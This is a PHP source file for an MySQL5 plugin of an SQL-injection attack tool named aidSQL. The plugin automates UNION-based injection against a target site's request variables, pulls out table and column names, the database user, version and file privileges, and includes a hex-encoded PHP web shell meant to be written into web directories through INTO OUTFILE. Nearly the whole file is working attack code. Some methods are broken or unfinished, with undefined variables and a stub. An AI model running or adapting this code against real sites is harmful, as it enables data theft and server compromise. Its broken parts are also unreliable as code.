<?php

	namespace aidSQL\plugin\sqli {

		class MySQL5 extends InjectionPlugin {

			const		PLUGIN_NAME						= "MySQL5 Standard Plugin by Juan Stange";

			private	$_affectedField				=	NULL;
			private	$_maxFields						=	NULL;
			private	$_table							=	NULL;
			private	$_totalRegisters				=	0;				//Total registers found by count(*)
			private	$_step							=	10;			//step LIMIT _currentRegisterStep,_currentRegisterStep+_step
			private	$_currentRegisterStep		=	0;
			private	$_fields							=	NULL;			//table fields
			private	$_useConcat						=	FALSE;		//Concat values with a tag like <aidsql></aidsql>
			private	$_openTag						=	NULL;
			private	$_closeTag						=	NULL;
			private	$_terminatingPayloads		=	array("LIMIT 1,1", " ORDER BY 1", "LIMIT 1,1 ORDER BY 1");
			private	$_currTerminatingPayload	=	NULL;
			private	$_commentPayloads				=	array("/*","--","#");
			private	$_affectedDatabases			=	array("mysql5");


			public function getPluginName(){
				return self::PLUGIN_NAME;
			}

			public function getAffectedDatabases(){
				return $this->_affectedDatabases;
			}

			/**
			*Checkout if the given URL by the HttpAdapter is vulnerable or not
			*This method combines execution
			*/

			public function isVulnerable(){

				$vars		= $this->_httpAdapter->getRequestVariables();

				$found	= FALSE;

				$payloads = array(
									"LIMIT 1,1",
									"ORDER BY 1"
				);

				$this->setUseConcat(TRUE);

				foreach($vars as $variable=>$value){

					$this->setAffectedVariable($variable,$value);

					for($i=1;$i<=$this->_injectionAttempts;$i++){

						$this->setMaxFields($i);

						foreach($this->_commentPayloads as $commentPayload){

							$this->setQueryCommentOpen($commentPayload);
				
							foreach($this->_terminatingPayloads as $terminatingPayload){

								$this->_currTerminatingPayload = $terminatingPayload;

								$injection	= $this->makeDiscoveryInjection();
						
								$this->log("[$variable] Attempt:\t$i",0);

								$matches = $this->analyzeInjection($injection);

								if(isset($matches[0])){

									$this->log("FOUND SQL INJECTION!!!");
									$this->log("Affected Variable:\t$variable");
									$this->log("Affected Fields:\t".implode($matches,","));
									$this->log("Field Count:\t$i");

									$field = $this->pickRandomValue($matches);

									$this->log("Picking field \"$field\" to perform further analysis ...");

									//Actually we can have a series of childNodes here any field is good, so we just pick
									//a random field.

									$this->setAffectedVariable($variable,$value);
									$this->setAffectedField($field);
									$this->setMaxFields($i);

									return TRUE;

								}

							}

						}

					}

					$this->_httpAdapter->addRequestVariable($variable,$value); //restore value if we couldnt find the vulnerable field

				}

				return FALSE;

			}


			public function setTotalRegisters($totalRegisters=0){

				$totalRegisters=(int)$totalRegisters;

				if(!$totalRegisters){
					throw (new \Exception("Total registers should be an integer greater than 0"));
				}

				$this->_totalRegisters = $totalRegisters;

			}

			public function setUseConcat($value=FALSE){

				$this->_useConcat=(boolean)$value;

			}

			private function generateRandomTag(){

				$rand = substr(md5(rand(0,time())),0,4);
				return "i$rand";

			}

			public function setOpenTag($openTag){
				$this->_openTag = $openTag;
			}

			public function setCloseTag($closeTag){
				$this->_closeTag = $closeTag;
			}

			public function getOpenTag(){

				if(!empty($this->_openTag)){
					return $this->_openTag;
				}

				$this->setOpenTag($this->generateRandomTag());

				return $this->_openTag;

			}

			public function getCloseTag(){

				if(!empty($this->_closeTag)){
					return $this->_closeTag;
				}

				$this->setCloseTag($this->generateRandomTag());

				return $this->_closeTag;

			}

			private function tagConcat($string){

				$pre	= NULL;
				$post	= NULL;

				if($this->_useConcat){

					$openConcatTag		=	\String::hexEncode($this->getOpenTag());
					$closeConcatTag	=	\String::hexEncode($this->getCloseTag());

					$pre					=	"CONCAT($openConcatTag,";
					$post					=	",$closeConcatTag)";

				}

				return $pre.$string.$post;

			}

			public function setStep($step=10){

				$step = (int)$step;

				if(!$step){
					throw (new \Exception("Step should be an integer greater than 0"));
				}

				$this->_step = $step;

			}

			public function setFields(Array $fields){

				$this->_fields = $fields;

			}

			/**
			 *	Returns an SQL injection string for the next sequence of registers
			 *
			 * @param Array $fields If not provided all fields will be used by default
			 * @return String SQL injection string for the next set of registers
			 * @return boolean FALSE No registers left
			 *
			 */

			public function getNext($fields=array()){

				$totalRegisters = (int)$this->_totalRegisters;

				if(!(int)$this->totalRegisters){
					throw(new \Exception("Cant call getNext without a total of registers set!"));
				}

				if($this->_currentRegisterStep==$this->_totalRegisters){
					return FALSE;
				}

				$limit = array($this->_currentRegisterStep.",".$this->_step);
				$this->select($fields,$limit);

				$this->_currentRegisterStep+=$this->_step;

			}

			/**
			*Sets the affected field to inject further commands
			*@param int $affectedField
			*/

			public function setAffectedField($affectedField=NULL){

				$affectedField = (int)$affectedField;

				if(is_null($affectedField)||$affectedField==0){
					throw (new \Exception("The affected field cannot be NULL or 0"));
				}

				$this->_affectedField = $affectedField;

			}

			public function setMaxFields($maxFields){

				$maxFields = (int)$maxFields;

				if(is_null($maxFields)||$maxFields==0){
					throw (new \Exception("The max fields cannot be NULL or 0"));
				}

				$this->_maxFields = $maxFields;

			}

			public function getTables(){

				$fieldInjection	= "GROUP_CONCAT(TABLE_NAME)";
				$tableInjection	= "FROM information_schema.tables WHERE table_schema=DATABASE()";

				return $this->generateInjection($fieldInjection,$tableInjection);

			}


			public function getColumns(){

				if(!isset($this->_table)){
					throw(new \Exception("Table must be set in order to call this method"));
				}

				$table = String::hexEncode($this->_table);

				$fieldInjection	= "COLUMN_NAME";
				$tableInjection	= "FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";

				return $this->generateInjection($fieldInjection,$tableInjection);


			}

			public function getDatabase(){

				$fieldInjection	= "DATABASE()";
				return $this->generateInjection($fieldInjection);

			}

			public function getUser(){

				$fieldInjection	= "USER()";
				return $this->generateInjection($fieldInjection);

			}

			public function getVersion(){

				$fieldInjection	= "@@version";
				return $this->generateInjection($fieldInjection);

			}

			public function getDatadir(){

				$fieldInjection	= "@@datadir";

				return $this->generateInjection($fieldInjection);

			}

			public function toFile(File $file){
				$fieldInjection = "INTO OUT_FILE ";
			}

			public function count(){

				if(!isset($this->_table)){
					throw(new \Exception("Cannot get register count from unespecified table, use setTable first"));
				}

				$fieldInjection	= "COUNT(*)";
				$tableInjection	= "FROM ".$this->_table;

				return $this->generateInjection($fieldInjection,$tableInjection);

			}

			/**
			 * Return a string containing proper SQL injection according to the parameters,
			 * if no parameter is passed, by default it will use all available fields.
			 * @param Array $fields the fields to be selected
			 * @param Array $limit
			 * @return String, injection string
			 */

			public function select($fields=NULL,$limit=NULL,$useTable=TRUE,$distinct=FALSE){

				if(is_array($fields)){

					$fields = implode($fields,",");

				}else{

					if(!sizeof($this->_fields)){

						throw (new \Exception("Cant make SQL Injection SELECT statement without any fields"));

					}

					$fields = implode($this->_fields,",");

				}

				//@TODO
				//We actually have to try to work around this one later hence some systems might
				//use htmlentities or similar to escape tags!

				if($distinct){

					$fieldInjection	= "DISTINCT $fields";

				} else {

					$fieldInjection	= "$fields";

				}

				if($useTable){
					$tableInjection	= "FROM ".$this->_table;
				}

				if(is_array($limit)){
					$tableInjection.=" LIMIT ".implode($limit,",");
				}

				return $this->generateInjection($select,$from);

			}

			public function makeDiscoveryInjection(){

				$discover = array();

				for($i=1;$i<=$this->_maxFields;$i++){

					$discover[]= $this->tagConcat($i);

				}

				return implode($discover,",");

			}

			/**
			 *	Basic method which generates Injection strings based on the affected field and the max amount
			 * of fields available, this method is private and should only be used in this class
			 * @param String $select Paylod for the select field (The affected field)
			 * @param String $from Payload for the FROM condition
			 * @return String, sql injection string
			 */

			private function generateInjection($select,$from=NULL){

				$fields=array();

				if(!isset($this->_maxFields)){

					throw (new \Exception("Cant generate injection with no field count!"));

				}

				if(!isset($this->_affectedField)){

					throw (new \Exception("Cant generate injection with no AFFECTED field set!"));

				}

				for($i=1;$i<=$this->_maxFields;$i++){

					if($i==$this->_affectedField){

						$fields[]=$this->tagConcat($select);

					}else{

						$fields[]=$i;

					}

				}

				$fields = implode($fields,",");

				if(!empty($from)){

					$fields.=" $from";

				}

				return $fields;

			}

			/**
			*Combines URL execution with parsing
			*/

			public function analyzeInjection($injection){

				$variable	= $this->_affectedVariable;
				$value		= $variable["value"];
				$variable	= $variable["variable"];

				if($value==""){

					$value = mt_rand(0,10);

					$this->log("WARNING! Variable value is not set, this will probably make this plugin not to work!",2,"yellow");
					$this->log("Be sure to specify a valid value for the URL variable of the site you're attacking.",2,"yellow");
					$this->log("Assuming random value for variable $variable. Value is: $value",2,"yellow");

				}

				$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
				$content		= $this->execute($variable,$value);

				if($content===FALSE){
					throw (new \Exception("There was a problem processing the request! Got ". $this->_httpCode."!!!"));
				}

				return $this->checkInjection($content);

			}

			private function checkInjection($content){


				$openTag		=	$this->getOpenTag();
				$closeTag	=	$this->getCloseTag();
				$this->log("String identifier is: $openTag - $closeTag",0,"white");

				$regex	= '/'.$openTag."+.*".$closeTag.'/';

				$matches = NULL;

				preg_match_all($regex,$content,$matches,PREG_SET_ORDER);

				if(sizeof($matches)){

					$matching = array();

					foreach($matches as $key=>$match){

						$match=$match[0];
						$match = preg_replace("/^($openTag)/",'',$match);
						$match = preg_replace("/($closeTag)/",'',$match);
						$matching[$key]=$match;
					}

					return $matching;

				}

				return FALSE;

			}

			private function pickRandomValue(Array $array){

				shuffle($array);
				return $array[0];

			}

			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){

				if(empty($dbUser)){
					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
				}

				if(!strpos($dbUser,"@")){
					throw (new \Exception("No @ found at database user!!!????"));
				}

				$user = substr($dbUser,0,strpos($dbUser,"@"));

				if(strtolower($user)=="root"){
					return TRUE;
				}

				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");

				//Check for the file privilege user permissions for writing
				//What it really takes to get a shell is the file writing privilege

				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
				return $this->analyzeInjection($filePrivilege);

			}

			public function checkPrivilege($privilege,$user=NULL){

				$privilege			=	\String::hexEncode($privilege);
				$fieldInjection	=	"is_grantable";

				if(is_null($user)){

					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";

				}else{

					$user					=	\String::hexEncode($user);
					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";

				}

				return $this->generateInjection($fieldInjection,$tableInjection);

			}

			public function getShell(\aidSQL\core\PluginLoader &$pLoader){

				$webDefaultsPlugin	=	$pLoader->getPluginInstance("disclosure","defaults",$this->_httpAdapter,$this->_log);
				$information			=	$webDefaultsPlugin->getInfo();

				if (!is_a($information,"\\aidSQL\\plugin\\disclosure\\DisclosureResult")){
					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\disclosure\\DisclosureResult"));
				}

				$webDirectories		=	$information->getWebDirectories();

				array_unshift($webDirectories,"");

				$unixDirectories		=	$information->getUnixDirectories();
				$winDirectories		=	$information->getWindowsDirectories();

				$shell				=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";

				if(!sizeof($webDirectories)){

					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red");
					continue;

				}

				foreach($webDirectories as $key=>$webDir){

					$this->log("Trying to inject shell in directory \"$dir\"",0,"white");

					foreach($unixDirectories as $unixDir){

						$outfile	=	"INTO OUTFILE $unixDir$webDir";

					}	

				}

			}

		}

	}
?>
